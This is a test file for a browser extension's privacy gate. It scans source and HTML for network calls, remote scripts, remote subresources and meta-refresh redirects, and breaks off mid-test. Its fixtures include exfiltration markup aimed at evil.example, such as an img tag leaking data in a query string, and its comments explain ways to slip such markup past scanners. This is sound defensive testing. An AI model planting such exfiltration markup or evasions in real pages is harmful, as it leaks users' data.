import { describe, it, expect } from 'vitest';
import { readdirSync, readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join, relative } from 'node:path';

// Golden principle #1 (local-only, no exfiltration) enforced mechanically:
// no external-network primitive may appear anywhere in the extension source.
// Downloads use URL.createObjectURL + <a download> (all local), so these tokens
// are never legitimately needed here. Any PR that adds one turns this gate red.
// See docs/conventions.md "Privacy invariant".
const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');

// The whole source tree, matching the invariant's own scope: a network call in
// src/core or src/settings exfiltrates just as effectively as one in an adapter.
const SCAN_DIRS = ['src'];

// Forbidden external-network primitives. Call-shaped for fetch/sendBeacon to
// avoid matching unrelated identifiers; bare token for XMLHttpRequest (its mere
// presence in these paths is the smell). navigator.sendBeacon is covered by the
// sendBeacon( pattern.
const FORBIDDEN: ReadonlyArray<{ name: string; pattern: RegExp }> = [
  { name: 'fetch()', pattern: /\bfetch\s*\(/ },
  { name: 'XMLHttpRequest', pattern: /\bXMLHttpRequest\b/ },
  { name: 'sendBeacon()', pattern: /\bsendBeacon\s*\(/ },
  // Outbound channels the extension-pages CSP does not reach: a content script runs in the
  // host page's world, so `connect-src` in OUR manifest never applies to it. Neither name is
  // used anywhere in src/, so the strict token match costs nothing.
  { name: 'WebSocket', pattern: /\bWebSocket\b/ },
  { name: 'EventSource', pattern: /\bEventSource\b/ },
];

// Cover every JS/TS module flavor, not just .ts(x): a future non-TS file in a
// guarded path must not slip a network call past the gate.
const SOURCE_FILE_RE = /\.(tsx?|jsx?|mjs|cjs)$/;

// The extension ships exactly one HTML file today (the options page), but the
// invariant is about the file type, not that one path.
const HTML_FILE_RE = /\.html?$/;

function collectFiles(absDir: string, match: RegExp): string[] {
  let entries;
  try {
    entries = readdirSync(absDir, { withFileTypes: true });
  } catch {
    // Unreadable directory — scan nothing rather than throw. For the `src` root
    // itself that is caught loudly by the "scans at least one source file" guard
    // below, which is the renamed/moved-source-tree case. It does NOT cover a
    // recursive call: an unreadable SUBdirectory is skipped silently, because the
    // sibling directories still yield files and the guard passes. Pre-existing and
    // never observed; noted so the guard is not read as broader than it is.
    return [];
  }
  const files: string[] = [];
  for (const entry of entries) {
    const abs = join(absDir, entry.name);
    if (entry.isDirectory()) {
      files.push(...collectFiles(abs, match));
    } else if (match.test(entry.name)) {
      files.push(abs);
    }
  }
  return files;
}

// Blank out comments and string/template literals (replacing their content with
// spaces, preserving newlines so line numbers stay accurate) before matching.
// This defeats two parser-differential evasions the naive per-line scan missed:
// a call split across lines (`fetch\n(`), which the FORBIDDEN patterns' `\s*`
// now spans over the preserved newlines; and a forbidden token that only looks
// like code but sits in a comment or string literal (a false positive we skip).
//
// Known limitation (accepted): template-literal `${...}` interpolation is blanked
// along with the surrounding literal, so a call inside it (`` `${fetch(x)}` ``) is
// NOT flagged. Descending into interpolation needs brace-nesting parsing — a
// semantic escape this static tripwire is deliberately not meant to resist (see
// the finding note in docs / the CodeQL data-flow option in backlog.md). Regex
// literals are treated as normal code, so a forbidden token inside one over-reports
// (safe direction).
function stripCommentsAndStrings(source: string): string {
  let out = '';
  let state: 'normal' | 'line' | 'block' | 'single' | 'double' | 'template' = 'normal';
  for (let i = 0; i < source.length; i++) {
    const c = source[i];
    const next = source[i + 1];
    switch (state) {
      case 'normal':
        if (c === '/' && next === '/') { state = 'line'; out += '  '; i++; }
        else if (c === '/' && next === '*') { state = 'block'; out += '  '; i++; }
        else if (c === "'") { state = 'single'; out += ' '; }
        else if (c === '"') { state = 'double'; out += ' '; }
        else if (c === '`') { state = 'template'; out += ' '; }
        else out += c;
        break;
      case 'line':
        if (c === '\n') { state = 'normal'; out += '\n'; }
        else out += ' ';
        break;
      case 'block':
        if (c === '*' && next === '/') { state = 'normal'; out += '  '; i++; }
        else out += c === '\n' ? '\n' : ' ';
        break;
      case 'single':
      case 'double':
      case 'template':
        if (c === '\\') { out += ' '; out += next === '\n' ? '\n' : ' '; i++; }
        else if ((state === 'single' && c === "'") ||
                 (state === 'double' && c === '"') ||
                 (state === 'template' && c === '`')) { state = 'normal'; out += ' '; }
        else out += c === '\n' ? '\n' : ' ';
        break;
    }
  }
  return out;
}

// Scan one already-read source for forbidden primitives, returning `label:line — name`
// for each hit. Comments/strings are blanked first so only real code matches.
function scanForViolations(rawSource: string, label: string): string[] {
  const source = stripCommentsAndStrings(rawSource);
  const violations: string[] = [];
  for (const { name, pattern } of FORBIDDEN) {
    const re = new RegExp(pattern.source, 'g');
    let m: RegExpExecArray | null;
    while ((m = re.exec(source)) !== null) {
      const lineNo = source.slice(0, m.index).split('\n').length;
      violations.push(`${label}:${lineNo} — ${name}`);
      if (m.index === re.lastIndex) re.lastIndex++; // guard against a zero-width match looping
    }
  }
  return violations;
}

// The HTML half of the invariant. The collector above reads JS/TS only, so an inline
// `<script>` in the options page — the one place this extension ships HTML — would carry
// a fetch() straight past the gate. Rather than run the JS tokenizer over HTML (it
// mis-tokenizes apostrophes in prose and `<!-- -->` comments, over-reporting noisily),
// assert the rule that is already true and already required: MV3's CSP forbids inline
// script in extension pages, so every `<script>` must load a `src=` module — and it must
// be a module the JS/TS half above actually reads, i.e. a relative path inside the tree.
// A remote `src` would be egress that neither half sees; an out-of-tree one loads code
// nothing scanned. Together the two halves read every executable-code file type present
// in `src/` — not every file (the `.ttf`/`.txt` under `src/export/fonts` are inert), and
// a future `.json`/`.vue`/`.svelte` would reopen the gap.
//
// Scope note: this checks `<script>` only. Every OTHER remote subresource in HTML is covered
// by findSubresourceViolations below, and blocked at runtime by the extension-pages CSP in
// manifest.config.ts (the primary control; this half is the static backup).

// Walk a tag's attribute text and yield every `name → raw value` pair (value quotes included,
// `undefined` for a valueless attribute). Walks by attribute NAME rather than substring-matching
// the blob: `src=` also occurs inside `data-src="…"` (a different attribute) and inside another
// attribute's quoted VALUE (`data-x="see src=a.js"`), and either read would let a genuine inline
// script through — the unsafe direction.
function readAttributes(attrs: string): Array<{ name: string; value: string | undefined }> {
  const re = /([\w:-]+)(?:\s*=\s*("[^"]*"|'[^']*'|[^\s>]*))?/g;
  const out: Array<{ name: string; value: string | undefined }> = [];
  let a: RegExpExecArray | null;
  while ((a = re.exec(attrs)) !== null) out.push({ name: a[1], value: a[2] });
  return out;
}

// Return the raw `src` attribute value (quotes included) of a tag's attribute text, or
// null when it has no `src` or a valueless one. Treating a valueless `src` as no source
// over-reports, which is the safe way.
function readSrcValue(attrs: string): string | null {
  for (const { name, value } of readAttributes(attrs)) {
    if (name.toLowerCase() === 'src' && value !== undefined) return value;
  }
  return null;
}

// A `<script src=…>` is only benign because the module it loads is itself scanned by the
// JS/TS half. That holds for a relative path inside the tree and for nothing else: an
// absolute or protocol-relative URL fetches from another origin — the exact egress Golden
// Principle #1 forbids — and a `..` segment escapes `src/` into files nothing reads.
// Bring an attribute value to the form the browser actually resolves, before classifying it.
// Testing the raw text is a false negative, measured both ways: the HTML parser decodes
// character references first, so `&#x68;ttps://evil.example/x.png` is a real https fetch, and
// the URL parser then strips ASCII tab/LF/CR from anywhere in the input, so `ht<TAB>tps://…`
// is too. Neither carries a scheme the raw-text regex below can see.
// Decode NUMERIC character references. Split out of normalizeUrlValue because the refresh pragma
// needs the same decoding applied to its SYNTAX, not just to the URL it yields. Named references
// are deliberately not decoded — the table is out of proportion for a tripwire — so each caller
// rejects or over-reports on a surviving `&` instead.
function decodeCharRefs(value: string): string {
  return value.replace(/&#(x[0-9a-f]+|\d+);?/gi, (_match, code: string) =>
    String.fromCodePoint(
      code[0].toLowerCase() === 'x' ? parseInt(code.slice(1), 16) : parseInt(code, 10),
    ),
  );
}

function normalizeUrlValue(rawValue: string): string {
  return (
    decodeCharRefs(rawValue.replace(/^["']|["']$/g, '').replace(/[\t\n\r]/g, ''))
      // The URL parser strips leading/trailing C0-control-or-space, which is NOT what JS `.trim()`
      // strips — measured: `.trim()` leaves 26 code points (U+0001–U+0008, U+000E–U+001F) in place
      // that the parser removes, so `&#1;https://evil.example/` kept a value with no scheme in
      // scheme position and `isLocalInTreeSrc` waved it through while a real browser fetched
      // `https://evil.example/`. Found in review, on a helper that predates this change but that
      // the refresh pragma — the vector with no runtime control — now depends on. Trimming exactly
      // the parser's set is also narrower than `.trim()` in the right direction: a leading NBSP is
      // NOT stripped by the URL parser either, so such a value really does stay same-origin.
      .replace(/^[\u0000-\u0020]+|[\u0000-\u0020]+$/g, '')
  );
}

// A `<script src=…>` is only benign because the module it loads is itself scanned by the
// JS/TS half. That holds for a relative path inside the tree and for nothing else: an
// absolute or protocol-relative URL fetches from another origin — the exact egress Golden
// Principle #1 forbids — and a `..` segment escapes `src/` into files nothing reads.
function isLocalInTreeSrc(rawValue: string): boolean {
  const value = normalizeUrlValue(rawValue);
  if (value === '') return false;
  // A NAMED character reference can hide a scheme too (`https&colon;//…`). Decoding the full
  // named set is out of proportion for a tripwire, and no value under `src/` contains an `&`
  // at all, so any survivor is rejected outright — over-reporting, the safe direction. A future
  // query string needing `&amp;` argues its own allowance.
  if (value.includes('&')) return false;
  if (/^[a-z][a-z0-9+.-]*:/i.test(value)) return false; // https:, data:, javascript:
  if (value.startsWith('//')) return false; // protocol-relative
  return !value.split(/[/\\]/).includes('..');
}

// Return a tag's attribute text — everything from `from` up to the tag-closing `>`.
// Follows the HTML tokenizer's attribute states rather than toggling on any quote char:
// a quote only opens a value when it sits in value position (right after `=`). Toggling
// on every quote desynchronizes the scan from the real parser in the UNSAFE direction —
// a quote in NAME position (`<script x">…`) or inside an UNQUOTED value
// (`<script data-x=a"b >…`) made the scanner run past the true tag end into the script
// body, where a `src=…` in the code re-tokenized as a real source attribute and masked a
// genuine inline script (both verified against a real parser). A `>` inside a properly
// quoted value still does not end the tag. Returns null when the tag never closes; a real
// parser drops such a tag entirely, and the caller flags it anyway (over-report, safe).
function readTagAttributes(html: string, from: number): string | null {
  let quote: '"' | "'" | null = null;
  let afterEquals = false;
  for (let i = from; i < html.length; i++) {
    const c = html[i];
    if (quote !== null) {
      if (c === quote) quote = null;
      continue;
    }
    if (c === '>') return html.slice(from, i);
    if (afterEquals && (c === '"' || c === "'")) {
      quote = c;
      afterEquals = false;
    } else if (c === '=') {
      afterEquals = true;
    } else if (!/\s/.test(c)) {
      afterEquals = false;
    }
  }
  return null;
}

// Report every `<script>` that runs code the JS/TS half never read — an inline body, or a
// remote/out-of-tree `src`. Returns `label:line — reason` per hit. Deliberately narrow
// tag matching, because the expected violation count is zero and what inaccuracy remains
// points the safe way: a `<script>` inside an `<!-- -->` comment is still flagged.
function findScriptViolations(rawHtml: string, label: string): string[] {
  const violations: string[] = [];
  const re = /<script\b/gi;
  let m: RegExpExecArray | null;
  while ((m = re.exec(rawHtml)) !== null) {
    const attrs = readTagAttributes(rawHtml, re.lastIndex);
    const src = attrs === null ? null : readSrcValue(attrs);
    if (src !== null && isLocalInTreeSrc(src)) continue;
    const lineNo = rawHtml.slice(0, m.index).split('\n').length;
    const reason = src === null ? 'inline <script>' : 'remote or out-of-tree <script src>';
    violations.push(`${label}:${lineNo} — ${reason}`);
  }
  return violations;
}

// Attributes the browser fetches from on its own, or that decide where such a fetch goes.
// Chosen by FETCH SEMANTICS, not by "looks like a URL": each of these pulls bytes from the
// value's origin with no user action, which is exactly the egress Golden Principle #1 forbids.
// `src` covers img/iframe/audio/video/source/track/embed/input[type=image]; `data` is <object>;
// `action`/`formaction` are submission targets a script can trigger; `background` is the legacy
// <body>/<table>/<tr>/<td> attribute Chrome still maps to background-image and still fetches.
// `imagesrcset` is what `<link rel="preload" as="image">` actually fetches from when present, and
// it takes the same candidate-list grammar as `srcset`.
const URL_ATTRS = new Set([
  'src',
  'srcset',
  'imagesrcset',
  'poster',
  'data',
  'action',
  'formaction',
  'background',
]);

// The attributes carrying a `srcset`-style candidate list rather than one URL.
const SRCSET_ATTRS = new Set(['srcset', 'imagesrcset']);

// `href` is checked on every tag EXCEPT these. Inverted from the old `['link', 'base']` allowlist
// deliberately: the set of tags that fetch from `href` is not one anybody can enumerate correctly
// and keep correct. Past <link> (an auto-fetched subresource) and <base> (which retargets every
// relative URL on the page) sit the SVG elements, where <image> and <feImage> fetch exactly like
// an <img> while a dozen more resolve references a browser may or may not follow off-document.
// Drawing that boundary wrong in the allowlist direction is a silent hole; defaulting to "checked"
// makes every such misjudgement an over-report instead. What must stay exempt is user-initiated
// NAVIGATION — <a>/<area>, in HTML and SVG alike — or this gate reddens the day the options page
// gains a legitimate outbound link. Those two are also the complete set of HTML elements that
// carry a live `href` besides <link>/<base>, so nothing else regresses.
const HREF_EXEMPT_TAGS = new Set(['a', 'area']);

// SVG fetches from the SVG 1.1 spelling `xlink:href` as well as the plain `href`, and the HTML
// parser keeps the prefix in the attribute name (measured: happy-dom yields `xlink:href` for
// `<svg><image xlink:href="…"/></svg>`). A scan matching `href` alone never sees it.
//
// Matched by suffix rather than against a two-entry set, for the same reason HREF_EXEMPT_TAGS is an
// exclusion list. Only the fixed `xlink:` prefix actually reaches a fetch — an HTML document has no
// namespace bindings, so `<svg xmlns:xl="…/xlink"><image xl:href="…"/></svg>` lands as a
// null-namespace attribute named literally `xl:href` that SVG never resolves (measured: happy-dom
// reports localName `xl:href`, namespace null, and `getAttributeNS(xlink, 'href')` null, against
// namespace `xlink`/localName `href` for the real spelling). Matching every `*:href` anyway costs
// an over-report on markup that fetches nothing, and buys not having to re-derive the parser's
// foreign-attribute adjustment table on the next read of this file.
function isHrefAttr(attr: string): boolean {
  return attr === 'href' || attr.endsWith(':href');
}

// Split a `srcset` into its candidate URLs (the token before each descriptor). Commas inside a
// URL would split wrongly, but every such URL carries a scheme (`data:`) and is rejected anyway,
// and a spurious extra candidate only over-reports — the safe direction.
function stripQuotes(rawValue: string): string {
  return rawValue.replace(/^["']|["']$/g, '');
}

function splitSrcset(rawValue: string): string[] {
  return stripQuotes(rawValue)
    .split(',')
    .map((candidate) => candidate.trim().split(/\s+/)[0])
    .filter((candidate) => candidate !== ''); // an empty candidate fetches nothing
}

// `<meta http-equiv="refresh" content="0;url=…">` performs an automatic top-level navigation to
// whatever the URL interpolates — no user action, no click. It is the one vector in this file with
// NO runtime control behind it: the extension-pages CSP restricts subresources and code, and Chrome
// dropped the `navigate-to` directive, so there is no directive that would stop it. For this vector
// the static gate is not the backup, it is the whole control.
//
// Returns every URL such a refresh could navigate to, skipping the ones that carry none —
// `content="0"` and an empty `url=` reload the current document, which is same-origin and leaks
// nothing. Parses each `content` per the HTML spec's shared declarative refresh steps loosely and
// always in the over-reporting direction: the time is treated as optional (a real parser requires
// it), `url=` genuinely IS optional (`content="0;https://…"` navigates — measured), and either `;`
// or `,` separates them. Quotes around the URL are left on for normalizeUrlValue to strip, as is
// the character-reference decoding the HTML parser already did.
//
// Takes the UNION over duplicate attributes — any `http-equiv` that reads `refresh` arms it, and
// every `content` is classified — rather than picking one occurrence. A duplicate attribute is a
// tokenizer parse error that browsers resolve by keeping the FIRST and dropping the rest (measured:
// happy-dom yields `http-equiv="refresh"` for `<meta content="0;url=https://evil.example/"
// http-equiv="refresh" http-equiv="not-refresh">`, i.e. a live navigation). A last-wins read of
// that markup returned clean — a real hole, found in review. Mirroring first-wins would close it
// but leave the gate coupled to a tokenizer rule it cannot see; the union closes it whichever
// occurrence a parser keeps. No duplicate attribute exists anywhere in `src/`, so the only cost is
// an over-report on markup that is already malformed.
function readMetaRefreshTargets(
  attrList: ReadonlyArray<{ name: string; value: string | undefined }>,
): string[] {
  let isRefresh = false;
  const contents: string[] = [];
  for (const { name, value } of attrList) {
    if (value === undefined) continue;
    const attr = name.toLowerCase();
    // Trimmed before comparing, which a real parser does NOT do — `http-equiv=" refresh "` is inert
    // in Chrome (the spec matches the attribute value exactly, ASCII case-insensitively). Treating
    // it as live over-reports, the safe direction.
    // Decoded BEFORE the comparison and before the grammar below, not after. The HTML parser
    // resolves character references in an attribute value before the refresh algorithm ever runs,
    // so an entity can hide in the pragma name (`ref&#x72;esh`), the separator (`0&#59;url=`) or
    // the keyword (`u&#x72;l=`) — all three measured as live navigations that a raw-text read
    // returned clean for. Decoding only the extracted URL, as the first cut did, is too late: the
    // grammar has already failed to find it. This is the same "classify the value the browser
    // resolves, not the text in the file" rule `normalizeUrlValue` exists for, applied to syntax.
    if (attr === 'http-equiv') {
      if (decodeCharRefs(stripQuotes(value)).trim().toLowerCase() === 'refresh') isRefresh = true;
    } else if (attr === 'content') contents.push(decodeCharRefs(stripQuotes(value)));
  }
  if (!isRefresh) return [];
  return contents
    .map((content) => /^\s*[\d.]*\s*[;,]?\s*(?:url\s*=\s*)?([\s\S]*)$/i.exec(content)?.[1].trim() ?? '')
    .filter((target) => target !== '');
}

// Report every URL-bearing attribute and CSS `url()` whose target is not a relative in-tree path.
// This is the half PR #41 left open: MV3's default CSP restricts executable code only, so a remote
// `<img src>`/`<iframe>`/`<form action>` — or a `url()` in the options page's inline `<style>` —
// was a working outbound channel that neither half of the gate read. Reuses isLocalInTreeSrc, so
// a scheme (`https:`, `data:`), a protocol-relative `//host`, and a `..` escape are all rejected.
function findSubresourceViolations(rawHtml: string, label: string): string[] {
  const violations: string[] = [];
  const lineOf = (index: number) => rawHtml.slice(0, index).split('\n').length;

  const tagRe = /<([a-zA-Z][\w:-]*)/g;
  let m: RegExpExecArray | null;
  while ((m = tagRe.exec(rawHtml)) !== null) {
    const tag = m[1].toLowerCase();
    // A tag left open at EOF IS dropped by a real parser (measured: happy-dom yields no element),
    // so it fetches nothing — but scan its text anyway rather than skipping. A file broken that
    // badly is not one whose parse anybody should be leaning on, and over-reporting is the safe
    // direction. Note this is only the EOF case: a tag merely missing its own `>` absorbs the
    // following markup up to the next one, which readTagAttributes already reproduces.
    const attrs = readTagAttributes(rawHtml, tagRe.lastIndex);
    // Resume the tag scan AFTER this tag's `>`. Without that, the next iteration restarts inside
    // the attribute text just read, so a tag-shaped string in a quoted VALUE
    // (`<div data-html="<img src='https://…'>">`) re-matches as a real tag — a false positive; a
    // real parser yields no such element (measured).
    if (attrs !== null) tagRe.lastIndex += attrs.length + 1;
    const attrList = readAttributes(attrs ?? rawHtml.slice(tagRe.lastIndex));
    // Handled per-TAG rather than per-attribute: the navigation is only live when `http-equiv` and
    // `content` are read together, and `content` is inert on every other `<meta>`.
    if (tag === 'meta') {
      for (const target of readMetaRefreshTargets(attrList)) {
        if (isLocalInTreeSrc(target)) continue;
        violations.push(
          `${label}:${lineOf(m.index)} — remote or out-of-tree <meta http-equiv=refresh>: ${stripQuotes(target)}`,
        );
      }
    }
    for (const { name, value } of attrList) {
      const attr = name.toLowerCase();
      // Skipped here is the VALUELESS attribute (`<img src>`, no `=` at all), which fetches
      // nothing. An explicit `src=""` is a different case and IS flagged: it resolves to the page
      // itself rather than off-origin, so the report is an over-report — the safe direction.
      const fetches = URL_ATTRS.has(attr) || (isHrefAttr(attr) && !HREF_EXEMPT_TAGS.has(tag));
      if (!fetches || value === undefined) continue;
      const targets = SRCSET_ATTRS.has(attr) ? splitSrcset(value) : [value];
      for (const target of targets) {
        if (isLocalInTreeSrc(target)) continue;
        // Name the offending target: a srcset with two remote candidates would otherwise emit the
        // same line twice, and the message would not say which URL to remove.
        violations.push(
          `${label}:${lineOf(m.index)} — remote or out-of-tree <${tag} ${attr}>: ${stripQuotes(target)}`,
        );
      }
    }
    // A tag left open at EOF IS dropped by a real parser (measured: happy-dom yields no element),
    // so it fetches nothing — but its text is scanned anyway rather than skipped, because a file
    // broken that badly is not one whose parse anybody should be leaning on. Nothing after it can
    // be a tag, so stop here rather than re-matching inside it.
    if (attrs === null) break;
  }

  // CSS `url()` — the options page is majority inline `<style>`, and a `background: url(https://…)`
  // there fetches just as automatically as an `<img>`. Scanning the raw text covers both `<style>`
  // blocks and `style=` attributes without a CSS parser.
  const cssUrlRe = /url\(\s*("[^"]*"|'[^']*'|[^)]*?)\s*\)/gi;
  let u: RegExpExecArray | null;
  while ((u = cssUrlRe.exec(rawHtml)) !== null) {
    if (isLocalInTreeSrc(u[1])) continue;
    violations.push(`${label}:${lineOf(u.index)} — remote or out-of-tree CSS url(): ${stripQuotes(u[1])}`);
  }

  // `@import` takes a bare string as well as a url(), and the bare form is the one the scan above
  // misses. It fetches a whole remote stylesheet, which can then pull further subresources. The
  // separator is `\s*`, not `\s+`: CSS tokenizes `@import"https://…"` as an at-keyword followed by
  // a string with no whitespace required, and that shape passed while the spaced one was caught.
  const cssImportRe = /@import\s*("[^"]*"|'[^']*')/gi;
  let i: RegExpExecArray | null;
  while ((i = cssImportRe.exec(rawHtml)) !== null) {
    if (isLocalInTreeSrc(i[1])) continue;
    violations.push(`${label}:${lineOf(i.index)} — remote or out-of-tree CSS @import: ${stripQuotes(i[1])}`);
  }

  return violations;
}

describe('privacy invariant: no external-network primitives anywhere in src/', () => {
  const files = SCAN_DIRS.flatMap((dir) => collectFiles(join(REPO_ROOT, dir), SOURCE_FILE_RE));

  it('scans at least one source file', () => {
    // Guards against the gate silently passing because a path typo made it scan
    // nothing (e.g. the source root was renamed). src/ always has code.
    expect(files.length).toBeGreaterThan(0);
  });

  it('contains no fetch/XMLHttpRequest/sendBeacon calls', () => {
    const violations = files.flatMap((file) =>
      scanForViolations(readFileSync(file, 'utf8'), relative(REPO_ROOT, file)),
    );
    expect(violations, `external-network primitive(s) found:\n${violations.join('\n')}`).toEqual([]);
  });
});

describe('privacy invariant: every script in src/ HTML loads an in-tree module', () => {
  const htmlFiles = SCAN_DIRS.flatMap((dir) => collectFiles(join(REPO_ROOT, dir), HTML_FILE_RE));

  it('scans at least one HTML file', () => {
    // Same renamed/moved-tree guard as the source scan: if the options page were
    // moved out of `src/`, this gate would pass by scanning nothing.
    expect(htmlFiles.length).toBeGreaterThan(0);
  });

  it('loads every script from a relative in-tree src= module', () => {
    const violations = htmlFiles.flatMap((file) =>
      findScriptViolations(readFileSync(file, 'utf8'), relative(REPO_ROOT, file)),
    );
    expect(
      violations,
      `script(s) the JS/TS scan cannot read (move the code to a relative module under src/):\n${violations.join('\n')}`,
    ).toEqual([]);
  });

  it('loads every subresource from a relative in-tree path', () => {
    // The other half of the same invariant: a remote `<img>`/`<iframe>`/`<form action>` or CSS
    // `url()` is an outbound request carrying whatever the page can read. Blocked at runtime by
    // the extension-pages CSP in manifest.config.ts; caught here before it ever ships.
    const violations = htmlFiles.flatMap((file) =>
      findSubresourceViolations(readFileSync(file, 'utf8'), relative(REPO_ROOT, file)),
    );
    expect(
      violations,
      `remote subresource(s) found (bundle the asset under src/ and reference it relatively):\n${violations.join('\n')}`,
    ).toEqual([]);
  });
});

describe('privacy gate detector: hardening against parser-differential evasion', () => {
  it('catches a call split across lines', () => {
    expect(scanForViolations('const x = fetch\n  (url);', 'f')).toEqual(['f:1 — fetch()']);
  });

  it('catches a token followed by a comment before the paren', () => {
    expect(scanForViolations('sendBeacon /* sneaky */ (data);', 'f')).toEqual(['f:1 — sendBeacon()']);
  });

  it('ignores a forbidden token inside a line comment', () => {
    expect(scanForViolations('// fetch(url) is documented here', 'f')).toEqual([]);
  });

  it('ignores a forbidden token inside a block comment', () => {
    expect(scanForViolations('/* example: XMLHttpRequest */\nconst ok = 1;', 'f')).toEqual([]);
  });

  it('ignores a forbidden token inside a string literal', () => {
    expect(scanForViolations('const s = "fetch(url)";', 'f')).toEqual([]);
  });

  it('ignores a forbidden token inside a template literal', () => {
    expect(scanForViolations('const s = `call fetch(x)`;', 'f')).toEqual([]);
  });

  it('reports the correct line number after preceding comments/strings', () => {
    const src = '// header\nconst s = "noise";\nfetch(url);';
    expect(scanForViolations(src, 'f')).toEqual(['f:3 — fetch()']);
  });

  it('still catches a real call adjacent to a string literal', () => {
    expect(scanForViolations('const u = "path"; fetch(u);', 'f')).toEqual(['f:1 — fetch()']);
  });
});

describe('privacy gate detector: inline <script> in HTML', () => {
  it('flags a bare inline script', () => {
    expect(findScriptViolations('<body>\n<script>fetch(url)</script>\n</body>', 'h')).toEqual([
      'h:2 — inline <script>',
    ]);
  });

  it('flags an inline script that carries other attributes', () => {
    expect(findScriptViolations('<script type="module">fetch(url)</script>', 'h')).toEqual([
      'h:1 — inline <script>',
    ]);
  });

  it('allows a script that loads a src= module', () => {
    expect(findScriptViolations('<script type="module" src="./main.ts"></script>', 'h')).toEqual([]);
  });

  it('allows src= written first, single-quoted, or spaced around the =', () => {
    expect(findScriptViolations("<script src = './a.js' defer></script>", 'h')).toEqual([]);
  });

  it('does not mistake a src-suffixed attribute name for src', () => {
    expect(findScriptViolations('<script data-src="x">code</script>', 'h')).toEqual([
      'h:1 — inline <script>',
    ]);
    expect(findScriptViolations('<script data-srcset="x">code</script>', 'h')).toEqual([
      'h:1 — inline <script>',
    ]);
  });

  it('does not mistake a src= substring inside another attribute value for src', () => {
    expect(findScriptViolations('<script data-x="see src=a.js">fetch(u)</script>', 'h')).toEqual([
      'h:1 — inline <script>',
    ]);
    expect(findScriptViolations("<script title='src=b.js'>fetch(u)</script>", 'h')).toEqual([
      'h:1 — inline <script>',
    ]);
  });

  it('does not let a > inside a quoted value truncate the tag into a fake src', () => {
    // Both build a real inline script in a browser parser (no src attribute, body runs).
    expect(findScriptViolations('<script data-x="pre src=oops.js> more" >fetch(u)</script>', 'h')).toEqual(
      ['h:1 — inline <script>'],
    );
    expect(findScriptViolations('<script data-x="a src=b.js>" >fetch(u)</script>', 'h')).toEqual([
      'h:1 — inline <script>',
    ]);
  });

  it('does not treat a quote in attribute-NAME position as opening a value', () => {
    // A real parser closes the tag at the first `>` here, yielding attribute `x"` with no
    // src and the body `var s = " src=a.js >"; fetch(u)` — a genuine inline script.
    // Toggling quote state on any quote char instead ran the scan into that body, where
    // `src=a.js` re-tokenized as a real source. Verified against Chromium and happy-dom.
    expect(findScriptViolations('<script x">var s = " src=a.js >"; fetch(u)</script>', 'h')).toEqual(
      ['h:1 — inline <script>'],
    );
  });

  it('does not treat a quote inside an UNQUOTED value as opening a value', () => {
    // Same desync one state over: the `"` in `data-x=a"b` is a literal, and the value ends
    // at the whitespace. A real parser gives tag 1 no src and the body `fetch(u)`.
    const html = '<script data-x=a"b >fetch(u)</script>\n<script src="c.js" data-y="a src=1.js>"></script>';
    expect(findScriptViolations(html, 'h')).toEqual(['h:1 — inline <script>']);
  });

  it('flags a script loaded from a remote origin', () => {
    // The gate's whole justification is that a `src=` module is one the JS/TS half reads.
    // A remote URL is egress neither half sees — Golden Principle #1's exact prohibition.
    expect(findScriptViolations('<script src="https://evil.example/x.js"></script>', 'h')).toEqual([
      'h:1 — remote or out-of-tree <script src>',
    ]);
    expect(findScriptViolations('<script src="//evil.example/x.js"></script>', 'h')).toEqual([
      'h:1 — remote or out-of-tree <script src>',
    ]);
    expect(findScriptViolations('<script src="data:text/javascript,fetch(u)"></script>', 'h')).toEqual(
      ['h:1 — remote or out-of-tree <script src>'],
    );
  });

  it('flags a script whose src escapes the scanned tree', () => {
    expect(
      findScriptViolations('<script src="../../node_modules/foo/dist/foo.js"></script>', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <script src>']);
  });

  it('flags a tag whose quote is never closed', () => {
    // A real parser drops the unterminated tag entirely, so nothing runs either way.
    expect(findScriptViolations('<script data-x="src=a.js>fetch(u)</script>', 'h')).toEqual([
      'h:1 — inline <script>',
    ]);
  });

  it('flags a valueless src attribute', () => {
    // Loads nothing, so the body is still inline. Over-reporting, the safe way.
    expect(findScriptViolations('<script src>code</script>', 'h')).toEqual(['h:1 — inline <script>']);
  });

  it('allows an unquoted src value', () => {
    expect(findScriptViolations('<script src=./main.js defer></script>', 'h')).toEqual([]);
  });

  it('flags an SVG <script href>, which loads its source from href rather than src', () => {
    // The third fetching `href` in SVG, and the only one that pulls executable code. It needs no
    // new rule: this half flags every <script> that lacks a relative in-tree `src=`, so an
    // href-sourced one is already caught — as "inline", which understates it but fails closed.
    // Pinned so a later reader does not "fix" the label by teaching readSrcValue about href and
    // accidentally waving a remote SVG script through.
    expect(
      findScriptViolations('<svg><script href="https://evil.example/x.js"></script></svg>', 'h'),
    ).toEqual(['h:1 — inline <script>']);
    expect(
      findScriptViolations('<svg><script xlink:href="https://evil.example/x.js"></script></svg>', 'h'),
    ).toEqual(['h:1 — inline <script>']);
  });

  it('reports every inline script in a file', () => {
    const html = '<script>a</script>\n<script src="b.js"></script>\n<script>c</script>';
    expect(findScriptViolations(html, 'h')).toEqual(['h:1 — inline <script>', 'h:3 — inline <script>']);
  });
});

describe('privacy gate detector: remote subresources in HTML', () => {
  it('flags the payload that passed the pre-#42 gate', () => {
    // The exact markup verified green against the `<script>`-only gate when this residual was
    // raised. It is a working exfiltration channel: the query string carries whatever the page read.
    expect(findSubresourceViolations('<img src="https://evil.example/p.gif?d=leak">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>: https://evil.example/p.gif?d=leak',
    ]);
  });

  it('flags a protocol-relative iframe', () => {
    expect(findSubresourceViolations('<iframe src="//evil.example/x"></iframe>', 'h')).toEqual([
      'h:1 — remote or out-of-tree <iframe src>: //evil.example/x',
    ]);
  });

  it('flags a remote form target on either attribute', () => {
    expect(findSubresourceViolations('<form action="https://evil.example/c"></form>', 'h')).toEqual([
      'h:1 — remote or out-of-tree <form action>: https://evil.example/c',
    ]);
    expect(
      findSubresourceViolations('<button formaction="https://evil.example/c">go</button>', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <button formaction>: https://evil.example/c']);
  });

  it('flags a remote candidate inside an otherwise local srcset', () => {
    expect(
      findSubresourceViolations('<img srcset="./b.png 2x, https://evil.example/a.png 1x">', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <img srcset>: https://evil.example/a.png']);
  });

  it('flags a remote object data and video poster', () => {
